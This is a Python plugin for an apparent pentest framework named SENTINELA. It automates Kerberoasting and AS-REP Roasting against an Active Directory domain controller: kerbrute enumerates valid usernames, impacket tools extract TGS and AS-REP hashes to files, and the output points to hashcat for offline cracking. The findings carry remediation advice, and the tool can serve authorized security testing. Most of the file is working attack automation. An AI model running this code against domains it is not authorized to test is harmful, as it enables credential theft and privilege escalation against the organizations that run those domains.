#!/usr/bin/env python3
"""
Plugin SENTINELA — Kerberoasting / AS-REP Roasting
Criado por github.com/3rr0rrr

Só roda se: (1) Kerberos foi detectado no alvo (porta 88 aberta — verifica
o resultado do recon, e faz um socket check próprio de fallback, já que a
lista de portas padrão da SENTINELA não inclui 88), e (2) `--mode
standard` ou mais agressivo (nunca em stealth).

Dois ataques, nenhum tenta CRACKEAR hash — só extrai e sinaliza que pode
ser levado offline pro hashcat/john:

  - Kerberoasting (impacket-GetUserSPNs): precisa de credencial de domínio
    válida (mesmo que de baixo privilégio), fornecida via --kerberos-user/
    --kerberos-pass/--kerberos-domain.
  - AS-REP Roasting (impacket-GetNPUsers): pode rodar SEM credencial, só
    com uma lista de nomes de usuário válidos. Se --username-wordlist for
    fornecida e `kerbrute` estiver disponível, primeiro enumera quais
    usuários da lista são válidos no domínio (kerbrute userenum), e usa
    só esses como entrada do GetNPUsers — evita ruído/erro com usuários
    inexistentes.

Sem credenciais E sem wordlist de usuário: pula com aviso claro.
"""

import os
import re
import shutil
import socket
import subprocess
import tempfile

from plugins.base import SentinelaPlugin


class KerberosAttacksPlugin(SentinelaPlugin):
    name           = "Kerberoasting / AS-REP Roasting"
    version        = "1.0.0"
    author         = "github.com/3rr0rrr"
    description    = "Extrai hashes TGS (Kerberoasting) e AS-REP de contas sem pre-auth, sem tentar quebrá-los"
    requires       = ["recon"]
    tags           = ["ad", "kerberos", "kerberoasting"]
    severity       = "high"
    enabled        = True
    stealth        = False
    min_confidence = 0.7
    max_findings   = 5
    timeout        = 120

    def run(self, target: str, context: dict) -> list:
        config = context.get("config", {}) or {}
        if config.get("intensity") == "passive" or config.get("mode") == "stealth":
            return []

        if not self._kerberos_detectado(target, context):
            return []

        domain = config.get("kerberos_domain")
        user = config.get("kerberos_user")
        password = config.get("kerberos_pass")
        wordlist_users = config.get("username_wordlist")

        if not domain:
            return []  # sem domínio informado, não dá pra montar nenhum dos dois ataques

        findings = []
        outdir = config.get("output", "sentinela_results")
        os.makedirs(outdir, exist_ok=True)

        if user and password:
            findings += self._kerberoasting(target, domain, user, password, outdir, config)
        else:
            self.log("Kerberoasting pulado — precisa de --kerberos-user/--kerberos-pass", "warn")

        usuarios_validos = self._enumerar_usuarios_kerbrute(target, domain, wordlist_users, config)
        if not usuarios_validos and user:
            usuarios_validos = [user]

        if usuarios_validos:
            findings += self._asrep_roasting(target, domain, usuarios_validos, outdir, config)
        else:
            self.log("AS-REP Roasting pulado — sem credencial nem lista de usuários válidos "
                     "(--username-wordlist + kerbrute, ou --kerberos-user)", "warn")

        return findings

    # ── Detecção de ambiente Kerberos ────────────────────────────────────────

    def _kerberos_detectado(self, target: str, context: dict) -> bool:
        open_ports = context.get("open_ports") or {}
        for host, portas in open_ports.items():
            if 88 in portas or "88" in portas:
                return True

        host = target.split(":")[0].split("/")[0]
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(3)
            aberto = s.connect_ex((host, 88)) == 0
            s.close()
            return aberto
        except Exception:
            return False

    # ── Kerberoasting ─────────────────────────────────────────────────────────

    def _kerberoasting(self, target: str, domain: str, user: str, password: str,
                        outdir: str, config: dict) -> list:
        if not shutil.which("impacket-GetUserSPNs"):
            self.log("impacket-GetUserSPNs não encontrado no sistema", "warn")
            return []

        dc_ip = target.split(":")[0].split("/")[0]
        outfile = os.path.join(outdir, "kerberoast_hashes.txt")
        cmd = [
            "impacket-GetUserSPNs", f"{domain}/{user}:{password}",
            "-dc-ip", dc_ip, "-request", "-outputfile", outfile,
        ]
        try:
            proc = subprocess.run(cmd, capture_output=True, text=True,
                                   timeout=config.get("tool_timeout", 120))
        except Exception as e:
            self.log(f"Erro ao rodar GetUserSPNs: {e}", "error")
            return []

        saida = (proc.stdout or "") + (proc.stderr or "")
        n_contas = len(re.findall(r"\$krb5tgs\$", saida)) or \
                   (self._contar_linhas_hash(outfile) if os.path.exists(outfile) else 0)

        if n_contas > 0:
            f = self.finding(
                severity         = "high",
                title            = f"Kerberoasting: {n_contas} conta(s) de serviço com hash TGS extraído",
                detail           = (
                    f"{n_contas} conta(s) de serviço (SPN) tiveram o Ticket Granting Service extraído. "
                    f"O hash foi salvo em `{outfile}` — NÃO foi feita nenhuma tentativa de quebra aqui. "
                    f"Leve o arquivo pro hashcat (`-m 13100`) ou john em ambiente controlado, com "
                    f"autorização, pra avaliar a força da senha da conta de serviço."
                ),
                url              = f"ldap://{dc_ip}",
                evidence         = f"hashes salvos em {outfile}",
                remediation      = "Usar senhas longas e aleatórias (25+ caracteres) para contas de serviço, "
                                    "ou migrar para gMSA (Group Managed Service Accounts), que rotacionam "
                                    "a senha automaticamente e não são kerberoastable.",
                confidence       = 0.95,
                impact           = 8.5,
                exploitability   = "requer-credencial-dominio",
                business_context = "Conta de serviço com senha fraca comprometida via Kerberoasting é um dos "
                                    "vetores mais comuns de escalação de privilégio em ambiente Active Directory.",
            )
            return [f] if f else []
        return []

    def _contar_linhas_hash(self, path: str) -> int:
        try:
            with open(path) as fh:
                return sum(1 for l in fh if l.strip())
        except Exception:
            return 0

    # ── Enumeração de usuário via kerbrute (opcional) ────────────────────────

    def _enumerar_usuarios_kerbrute(self, target: str, domain: str,
                                     wordlist_users: str, config: dict) -> list:
        if not wordlist_users or not os.path.exists(wordlist_users):
            return []
        if not shutil.which("kerbrute"):
            self.log("kerbrute não instalado — pulando enumeração de usuário "
                     "(AS-REP Roasting pode rodar mesmo assim se --kerberos-user for informado)", "warn")
            return []

        dc_ip = target.split(":")[0].split("/")[0]
        cmd = ["kerbrute", "userenum", "-d", domain, "--dc", dc_ip, wordlist_users]
        try:
            proc = subprocess.run(cmd, capture_output=True, text=True,
                                   timeout=config.get("tool_timeout", 120))
        except Exception as e:
            self.log(f"Erro ao rodar kerbrute: {e}", "error")
            return []

        validos = re.findall(r"VALID USERNAME:\s+(\S+)@", proc.stdout or "")
        if validos:
            self.log(f"kerbrute encontrou {len(validos)} usuário(s) válido(s)", "success")
        return validos

    # ── AS-REP Roasting ───────────────────────────────────────────────────────

    def _asrep_roasting(self, target: str, domain: str, usuarios: list,
                         outdir: str, config: dict) -> list:
        if not shutil.which("impacket-GetNPUsers"):
            self.log("impacket-GetNPUsers não encontrado no sistema", "warn")
            return []

        with tempfile.NamedTemporaryFile(mode="w", suffix=".txt", delete=False) as tmp:
            tmp.write("\n".join(usuarios))
            userlist_path = tmp.name

        dc_ip = target.split(":")[0].split("/")[0]
        outfile = os.path.join(outdir, "asrep_hashes.txt")
        cmd = [
            "impacket-GetNPUsers", f"{domain}/", "-usersfile", userlist_path,
            "-format", "hashcat", "-outputfile", outfile, "-dc-ip", dc_ip,
        ]
        try:
            proc = subprocess.run(cmd, capture_output=True, text=True,
                                   timeout=config.get("tool_timeout", 120))
        finally:
            try:
                os.unlink(userlist_path)
            except OSError:
                pass

        saida = (proc.stdout or "") + (proc.stderr or "")
        n_contas = len(re.findall(r"\$krb5asrep\$", saida)) or \
                   (self._contar_linhas_hash(outfile) if os.path.exists(outfile) else 0)

        if n_contas > 0:
            f = self.finding(
                severity         = "high",
                title            = f"AS-REP Roasting: {n_contas} conta(s) sem pre-autenticação Kerberos",
                detail           = (
                    f"{n_contas} conta(s) de usuário estão configuradas com 'Do not require Kerberos "
                    f"preauthentication' — permite extrair o hash AS-REP SEM nenhuma credencial válida. "
                    f"Hash salvo em `{outfile}`, NÃO foi feita tentativa de quebra."
                ),
                url              = f"ldap://{dc_ip}",
                evidence         = f"hashes salvos em {outfile}",
                remediation      = "Reabilitar pre-autenticação Kerberos para todas as contas, a menos que "
                                    "haja uma razão técnica específica documentada para desabilitar.",
                confidence       = 0.95,
                impact           = 8.0,
                exploitability   = "pre-auth",
                business_context = "AS-REP Roasting não exige credencial nenhuma — é um dos ataques de "
                                    "menor esforço/maior impacto em reconhecimento inicial de Active Directory.",
            )
            return [f] if f else []
        return []
